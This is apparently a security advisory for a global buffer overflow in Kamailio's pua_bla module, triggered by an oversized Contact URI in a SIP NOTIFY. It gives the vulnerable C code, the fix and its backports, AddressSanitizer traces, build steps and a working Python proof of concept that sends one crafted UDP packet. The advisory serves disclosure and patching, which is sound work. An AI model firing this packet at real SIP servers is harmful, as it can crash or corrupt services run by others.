# pua_bla: Static buffer overflow in bla_handle_notify() via Contact URI

**Module**: pua_bla
**Severity**: High (pre-auth global buffer overflow, 325-byte write into 255-byte buffer)
**Tested against**: kamailio commit `7c2d6bffa348` (2026-04-21)
**Fixed in**: [`7f4c4c5a66`](https://github.com/kamailio/kamailio/commit/7f4c4c5a66) ("pua_bla: Verify header length")
**Committed**: 2026-05-04 15:15:26 UTC
**Stable backports**: Kamailio 6.1 [`0767d7386d`](https://github.com/kamailio/kamailio/commit/0767d7386ddc5892e3e9d5b19fb4219fb2020fe0) (2026-05-18) and Kamailio 6.0 [`573982c713`](https://github.com/kamailio/kamailio/commit/573982c71314bfc884fa611d40cdeecdbcf01bf6) (2026-06-16)

---

## Fix

The fix calculates the complete extra-header size—the configured header name, `": "`, attacker-controlled Contact URI, and trailing CRLF—before performing any copy. If the total exceeds the 255-byte static buffer, `bla_handle_notify()` logs an error and follows its existing error path without constructing or publishing the header.

`bla_handle_notify()` in `notify.c` copies the Contact header URI into `static char buf[255]` using sequential `memcpy()` calls without bounds checking. With the default `header_name` of "Sender" (6 bytes), 8 bytes are consumed before the Contact URI is copied (`"Sender"` + `": "`). A Contact URI exceeding 245 bytes overflows the 255-byte global buffer, corrupting adjacent globals including `default_domain`.

The overflow is triggered by a single NOTIFY message. While it requires the pua_bla module to be loaded and a dialog context to exist, the Contact header content is fully attacker-controlled and the overflow is straightforward.

## Vulnerable code

```c
// notify.c:46 + lines 190-197 — bla_handle_notify()
static char buf[255];                                                    // line 46

// ...
extra_headers.s = buf;
memcpy(extra_headers.s, header_name.s, header_name.len);                 // "Sender" = 6 bytes
extra_headers.len = header_name.len;
memcpy(extra_headers.s + extra_headers.len, ": ", 2);                    // 2 bytes  (total: 8)
extra_headers.len += 2;
memcpy(extra_headers.s + extra_headers.len, contact.s, contact.len);     // OVERFLOW: no check
extra_headers.len += contact.len;
memcpy(extra_headers.s + extra_headers.len, CRLF, CRLF_LEN);            // extends overflow
```

No length validation on `contact.len` before the copy. The `contact` value comes directly from the Contact header in the incoming NOTIFY.

## Call chain

```
udp_rcv_loop()
  → receive_msg()
    → run_top_route()
      → do_action()                     [routing script: bla_handle_notify()]
        → ki_bla_handle_notify()
          → bla_handle_notify()         ← GLOBAL OVERFLOW at memcpy (line 194)
```

## PoC

```python
#!/usr/bin/env python3
"""
PoC: pua_bla module bla_handle_notify() static buffer overflow
Target: kamailio with pua_bla module loaded + NOTIFY routing to bla_handle_notify()

Bug: pua_bla/notify.c bla_handle_notify() line 194
     memcpy(extra_headers.s + extra_headers.len, contact.s, contact.len)
     Copies Contact URI into static char buf[255] without bounds check.
     header_name ("Sender") + ": " = 8 bytes overhead + CRLF(2) = 10
     Contact URI > ~245 bytes overflows buf[255].

Trigger: Send NOTIFY with Contact header containing URI > 245 bytes.
"""
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 5060

long_contact = "sip:" + "A" * 300 + "@overflow.example.com"

body = '<?xml version="1.0"?><dialog-info xmlns="urn:ietf:params:xml:ns:dialog-info" version="1" state="full" entity="sip:test@127.0.0.1"></dialog-info>'

msg = (
    f"NOTIFY sip:test@{TARGET} SIP/2.0\r\n"
    f"Via: SIP/2.0/UDP 192.168.1.100:5060;branch=z9hG4bK-pua-bla-of\r\n"
    f"From: <sip:attacker@{TARGET}>;tag=bla-from-tag\r\n"
    f"To: <sip:test@{TARGET}>;tag=bla-to-tag\r\n"
    f"Call-ID: pua-bla-overflow@192.168.1.100\r\n"
    f"CSeq: 1 NOTIFY\r\n"
    f"Contact: <{long_contact}>\r\n"
    f"Event: dialog;sla\r\n"
    f"Subscription-State: active;expires=3600\r\n"
    f"Content-Type: application/dialog-info+xml\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Max-Forwards: 70\r\n"
    f"\r\n"
    f"{body}"
)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
print(f"[*] Sending NOTIFY with Contact URI len={len(long_contact)}")
sock.sendto(msg.encode(), (TARGET, PORT))

try:
    resp = sock.recv(4096)
    print(f"[*] Response: {resp[:80]}")
except socket.timeout:
    print("[*] No response (server may have crashed)")

sock.close()
```

## ASan output

Two violations fire: the initial `memcpy` WRITE overflows the global `buf[255]`, then `publish_cbparam` READs from the corrupted buffer:

**Report 1: memcpy WRITE overflows static buf[255]**

```
=================================================================
==7==ERROR: AddressSanitizer: global-buffer-overflow on address 0xffff951a405f at pc 0xaaaab35f5b94 bp 0xffffc761f780 sp 0xffffc761ef70
WRITE of size 325 at 0xffff951a405f thread T0
    #0 0xaaaab35f5b90 in __asan_memcpy (/usr/local/sbin/kamailio+0x2b5b90) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #1 0xffff9516b450 in bla_handle_notify /usr/src/kamailio/build/src/modules/pua_bla/notify.c:194:2
    #2 0xaaaab366858c in do_action /usr/src/kamailio/build/src/core/action.c:1123:4
    #3 0xaaaab368d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #4 0xaaaab366cfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #5 0xaaaab368d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #6 0xaaaab3690390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #7 0xaaaab3b91c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #8 0xaaaab3e811b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #9 0xaaaab3644b28 in main_loop /usr/src/kamailio/build/src/main.c
    #10 0xaaaab365ee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #11 0xffff96777740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #12 0xffff96777814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #13 0xaaaab357f56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

0xffff951a405f is located 33 bytes to the left of global variable 'default_domain' defined in '/usr/src/kamailio/src/modules/pua_bla/pua_bla.c:42:5' (0xffff951a4080) of size 16
0xffff951a405f is located 0 bytes to the right of global variable 'buf' defined in '/usr/src/kamailio/src/modules/pua_bla/notify.c:46:14' (0xffff951a3f60) of size 255
SUMMARY: AddressSanitizer: global-buffer-overflow (/usr/local/sbin/kamailio+0x2b5b90) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9) in __asan_memcpy
Shadow bytes around the buggy address:
  0x200ff2a347b0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ff2a347c0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ff2a347d0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ff2a347e0: f9 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00
  0x200ff2a347f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff2a34800: 00 00 00 00 00 00 00 00 00 00 00[07]f9 f9 f9 f9
  0x200ff2a34810: 00 00 f9 f9 00 00 f9 f9 00 00 f9 f9 04 f9 f9 f9
  0x200ff2a34820: 00 00 f9 f9 00 00 f9 f9 00 00 00 00 00 00 00 f9
  0x200ff2a34830: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff2a34840: 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 f9
  0x200ff2a34850: 00 f9 f9 f9 00 f9 f9 f9 00 f9 f9 f9 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

**Report 2: publish_cbparam READ from corrupted buffer (335 bytes from 255-byte region)**

```
=================================================================
==7==ERROR: AddressSanitizer: global-buffer-overflow on address 0xffff951a405f at pc 0xaaaab35f5af8 bp 0xffffc761e740 sp 0xffffc761df30
READ of size 335 at 0xffff951a405f thread T0
    #0 0xaaaab35f5af4 in __asan_memcpy (/usr/local/sbin/kamailio+0x2b5af4) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #1 0xffff9117ef6c in publish_cbparam /usr/src/kamailio/build/src/modules/pua/send_publish.c:738:3
    #2 0xffff91175fd8 in send_publish /usr/src/kamailio/build/src/modules/pua/send_publish.c:594:13
    #3 0xffff9516b558 in bla_handle_notify /usr/src/kamailio/build/src/modules/pua_bla/notify.c:205:5
    #4 0xaaaab366858c in do_action /usr/src/kamailio/build/src/core/action.c:1123:4
    #5 0xaaaab368d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #6 0xaaaab366cfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #7 0xaaaab368d844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #8 0xaaaab3690390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #9 0xaaaab3b91c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #10 0xaaaab3e811b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #11 0xaaaab3644b28 in main_loop /usr/src/kamailio/build/src/main.c
    #12 0xaaaab365ee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #13 0xffff96777740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #14 0xffff96777814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #15 0xaaaab357f56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

0xffff951a405f is located 33 bytes to the left of global variable 'default_domain' defined in '/usr/src/kamailio/src/modules/pua_bla/pua_bla.c:42:5' (0xffff951a4080) of size 16
0xffff951a405f is located 0 bytes to the right of global variable 'buf' defined in '/usr/src/kamailio/src/modules/pua_bla/notify.c:46:14' (0xffff951a3f60) of size 255
SUMMARY: AddressSanitizer: global-buffer-overflow (/usr/local/sbin/kamailio+0x2b5af4) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9) in __asan_memcpy
Shadow bytes around the buggy address:
  0x200ff2a347b0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ff2a347c0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ff2a347d0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ff2a347e0: f9 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00
  0x200ff2a347f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff2a34800: 00 00 00 00 00 00 00 00 00 00 00[07]f9 f9 f9 f9
  0x200ff2a34810: 00 00 f9 f9 00 00 f9 f9 00 00 f9 f9 04 f9 f9 f9
  0x200ff2a34820: 00 00 f9 f9 00 00 f9 f9 00 00 00 00 00 00 00 f9
  0x200ff2a34830: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff2a34840: 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 f9
  0x200ff2a34850: 00 f9 f9 f9 00 f9 f9 f9 00 f9 f9 f9 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

## Build & reproduce

```bash
git clone https://github.com/kamailio/kamailio.git
cd kamailio && git checkout 7c2d6bffa348

mkdir build && cd build
CC=clang cmake .. \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -O1 -g" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
    -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address"
make -j$(nproc) && make install

# kamailio.cfg must load pua_bla and route NOTIFYs:
#   loadmodule "pua.so"
#   loadmodule "pua_bla.so"
#   route { if(is_method("NOTIFY")) { bla_handle_notify(); } }

# Also requires a PUA dialog entry (e.g., pre-populated pua table via db_text)

ASAN_OPTIONS="detect_leaks=0:halt_on_error=0:log_path=/tmp/asan" \
    kamailio -DD -E -f kamailio.cfg

python3 poc.py 127.0.0.1
cat /tmp/asan.*
```
